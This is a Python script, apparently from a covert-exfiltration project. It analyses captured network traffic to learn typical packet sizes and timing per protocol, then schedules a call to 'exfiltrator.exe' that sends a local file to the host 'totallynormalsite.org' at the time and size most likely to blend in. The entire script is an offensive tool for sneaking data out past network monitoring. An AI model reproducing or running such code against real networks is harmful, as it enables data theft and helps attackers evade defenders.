#!/usr/bin/python3
# -*- coding: utf-8 -*-
import csv
import datetime
import dpkt
import linecache
import math
import more_itertools
import os
import schedule
import socket
import time
from dpkt.compat import compat_ord
import ts

def call_exfil(protocol, packet_length):
	#call exfiltration module through scheduler
	global completed
	os.system('exfiltrator.exe -d "totallynormalsite.org" -f ./test.txt -i {} -s {}'.format(protocol, packet_length))
	print(protocol)
	print(packet_length)
	
	completed = True
	return schedule.CancelJob
	
def schedule_exfil(optimal_time, protocol, packet_length):
	# Unix epoch time starts on Thursday so 4 days worth of seconds are added to set the timestamp to Monday
	date = datetime.datetime.utcfromtimestamp(optimal_time + 345600)
	print(date.strftime('%A %H:%M'))
	day = date.weekday()
	hour = date.hour
	minute = date.minute

	# This is really ugly, the library doesn't support a way to dynamically set days of the week, they are all just static attribute names
	if(day == 0):
		schedule.every().monday.at('{}:{}'.format(hour, minute)).do(call_exfil, protocol, packet_length)
	if(day == 1):
		schedule.every().tuesday.at('{}:{}'.format(hour, minute)).do(call_exfil, protocol, packet_length)
	if(day == 2):
		schedule.every().wednesday.at('{}:{}'.format(hour, minute)).do(call_exfil, protocol, packet_length)
	if(day == 3):
		schedule.every().thursday.at('{}:{}'.format(hour, minute)).do(call_exfil, protocol, packet_length)
	if(day == 4):
		schedule.every().friday.at('{}:{}'.format(hour, minute)).do(call_exfil, protocol, packet_length)
	if(day == 5):
		schedule.every().saturday.at('{}:{}'.format(hour, minute)).do(call_exfil, protocol, packet_length)
	if(day == 6):
		schedule.every().sunday.at('{}:{}'.format(hour, minute)).do(call_exfil, protocol, packet_length)

def packet_length_lookup(optimal_time, protocol):
	l = linecache.getline('packet_lengths_{}.csv'.format(protocol.lower()),math.ceil(optimal_time / 60)).split(',')
	packet_length = l[1].rstrip('\n')
	return packet_length

def print_packets_to_csv(csv_entries, protocol, s):
	if s == 1:
		with open('packets_{}.csv'.format(protocol), 'w', newline='') as packets_csv:
			writer = csv.writer(packets_csv, delimiter=',', quoting=csv.QUOTE_NONE, escapechar='\\')
			for entry in csv_entries:
				writer.writerow(entry)
		packets_csv.close()
	elif s == 2:
		with open('packet_lengths_{}.csv'.format(protocol), 'w', newline='') as packets_csv:
			writer = csv.writer(packets_csv, delimiter=',', quoting=csv.QUOTE_NONE, escapechar='\\')
			for entry in csv_entries:
				writer.writerow(entry)
		packets_csv.close()

# Sort packet entries and write to CSVs
def writer(csv_entries_icmp, csv_entries_https, csv_entries_dns, csv_entries_ntp, csv_entries_http, csv_entries_pop):
	csv_entries_icmp = sorted(csv_entries_icmp, key=lambda e: e[2])
	csv_entries_https = sorted(csv_entries_https, key=lambda e: e[2])
	csv_entries_dns = sorted(csv_entries_dns, key=lambda e: e[2])
	csv_entries_ntp = sorted(csv_entries_ntp, key=lambda e: e[2])
	csv_entries_http = sorted(csv_entries_http, key=lambda e: e[2])
	csv_entries_pop = sorted(csv_entries_pop, key=lambda e: e[2])
	
	print_packets_to_csv(csv_entries_icmp, "icmp",1)
	print_packets_to_csv(csv_entries_https, "https",1)
	print_packets_to_csv(csv_entries_dns, "dns",1)
	print_packets_to_csv(csv_entries_ntp, "ntp",1)
	print_packets_to_csv(csv_entries_http, "http",1)
	print_packets_to_csv(csv_entries_pop, "pop",1)
	
	length_time(csv_entries_icmp, "icmp")
	length_time(csv_entries_https, "https")
	length_time(csv_entries_dns, "dns")
	length_time(csv_entries_ntp, "ntp")
	length_time(csv_entries_http, "http")
	length_time(csv_entries_pop, "pop")
	
# For each packet in the pcap process the contents
def pcap_processor(pcap):
	csv_entries_icmp = []
	csv_entries_https = []
	csv_entries_dns = []
	csv_entries_ntp = []
	csv_entries_http = []
	csv_entries_pop = []

	for timestamp, buf in pcap:
	    # Print out the timestamp in UTC
		timestamp = int(timestamp)
	    # Unpack the Ethernet frame (mac src/dst, ethertype)
		eth = dpkt.ethernet.Ethernet(buf)
		
		ip = eth.data
	    # Make sure the Ethernet frame contains an IP packet
		if isinstance(eth.data, dpkt.ip.IP):
			if ip.p == 6:
				tcp = ip.data
				# Pull out fragment information (flags and offset all packed into off field, so use bitmasks)
				if tcp.dport == 110:
					timestamp = (timestamp + 244800) % 604800
					bin = timestamp - timestamp % 60
					entry = [timestamp,ip.len,bin]
					csv_entries_pop.append(entry)
				elif tcp.dport == 80:
					if ip.len > 300:
						timestamp = (timestamp + 244800) % 604800
						bin = timestamp - timestamp % 60
						entry = [timestamp,ip.len,bin]
						csv_entries_http.append(entry)
				elif tcp.dport == 443:
					if ip.len > 300:
						timestamp = (timestamp + 244800) % 604800
						bin = timestamp - timestamp % 60
						entry = [timestamp,ip.len,bin]
						csv_entries_https.append(entry)
			elif ip.p == 17:
				udp = ip.data
				if udp.dport == 53:
					timestamp = (timestamp + 244800) % 604800
					bin = timestamp - timestamp % 60
					entry = [timestamp,ip.len,bin]
					csv_entries_dns.append(entry)
				elif udp.dport == 123:
					timestamp = (timestamp + 244800) % 604800
					bin = timestamp - timestamp % 60
					entry = [timestamp,ip.len,bin]
					csv_entries_ntp.append(entry)
			elif isinstance(ip.data, dpkt.icmp.ICMP):
				icmp = ip.data
				timestamp = (timestamp + 244800) % 604800
				bin = timestamp - timestamp % 60
				entry = [timestamp,ip.len,bin]
				csv_entries_icmp.append(entry)

	writer(csv_entries_icmp, csv_entries_https, csv_entries_dns, csv_entries_ntp, csv_entries_http, csv_entries_pop)

# This function will go through all entries in a given protocol's processed traffic to find the mode packet length of each time bucket		
def length_time(entries, protocol):
	# Creating a peekable iterator
	iterator = more_itertools.peekable(entries)
	bucket_lengths = []
	
	# Initialize the peek value for processing
	try:
		peek = iterator.peek()[2]
	except StopIteration:
		peek = 0
		
	# 10080 is the amount of 60 second buckets in one week
	for i in range(0, 10080):
		
		bucket_entries = []
		current_bucket = i * 60
		
		# Add all lengths in a bucket to the bucket_entries list
		while current_bucket == peek:
			try:
				bucket_entries.append(iterator.__next__()[1])
				peek = iterator.peek()[2]
			except StopIteration:
				break
				
		# Determine the mode packet length for the current bucket and add an entry to the bucket list (hehe)
		if bucket_entries:
			bucket_lengths.append([current_bucket,max(set(bucket_entries), key=bucket_entries.count)])
		else:
			bucket_lengths.append([current_bucket,0])

	print_packets_to_csv(bucket_lengths, protocol,2)
	
def time_series():
	# Get current timestamp in standardized format
	current_time = datetime.datetime.now()
	current_time = math.ceil(time.mktime(current_time.timetuple()))
	current_time = (current_time + 244800) % 604800
	
	optimal_time, protocol = ts.optimum(current_time)
	
	return optimal_time, protocol
	
def preprocess():
    """Open up a test pcap file"""
    with open('personalAndPublic7.pcap', 'rb') as f:
        pcap = dpkt.pcap.Reader(f)
        pcap_processor(pcap)
		
    optimal_time, protocol = time_series()
    packet_length = packet_length_lookup(optimal_time, protocol)
    schedule_exfil(optimal_time, protocol, packet_length)
	
    while not completed:
        schedule.run_pending()
        time.sleep(1)

completed = False
		
if __name__ == '__main__':
	preprocess()

	